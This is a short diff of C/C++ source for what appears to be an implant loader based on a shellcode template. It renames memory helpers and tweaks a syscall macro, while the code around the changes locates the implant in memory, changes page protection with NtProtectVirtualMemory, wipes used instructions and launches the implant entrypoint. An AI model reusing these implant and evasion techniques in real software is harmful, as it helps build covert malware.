@@ -12,7 +12,7 @@ EXTERN_C FUNC VOID PreMain(
     ULONG    Protect  = { 0 };
     CHAR     Error    = { 0 };
 
-    MmZero( & Stardust, sizeof( Stardust ) );
+    Imperium::mem::zero( &Stardust, sizeof( Stardust ) );
 
     //
     // get the base address of the current implant in memory and the end.
@@ -41,9 +41,9 @@ EXTERN_C FUNC VOID PreMain(
     // change the protection of the .global section page to RW
     // to be able to write the allocated instance heap address
     //
-    //SYSCALL_PREPARE( Stardust.Win32.NtProtectVirtualMemory );
-    if ( ! NT_SUCCESS(                         //SYSCALL_INVOKE(
-        Stardust.Win32.NtProtectVirtualMemory( //,
+    //SYSCALL_PREPARE_STARDUST( Stardust.Syscall, Stardust.Win32.NtProtectVirtualMemory );
+    if ( ! NT_SUCCESS( //SYSCALL_INVOKE(
+        Stardust.Win32.NtProtectVirtualMemory(
             NtCurrentProcess(),
             & MmAddr,
             & MmSize,
@@ -66,9 +66,9 @@ EXTERN_C FUNC VOID PreMain(
     // remove RtRipEnd code/instructions as
     // they are not needed anymore
     //
-    MmCopy( C_DEF( MmAddr ), &Stardust, sizeof( INSTANCE ) );
-    MmZero( & Stardust, sizeof( INSTANCE ) );
-    MmZero( C_PTR( U_PTR( MmAddr ) + sizeof( PVOID ) ), 0x18 );
+    Imperium::mem::copy( C_DEF( MmAddr ), &Stardust, sizeof( INSTANCE ) );
+    Imperium::mem::zero( &Stardust, sizeof( INSTANCE ) );
+    Imperium::mem::zero( C_PTR( U_PTR( MmAddr ) + sizeof( PVOID ) ), 0x18 );
 
     //
     // now execute the implant entrypoint
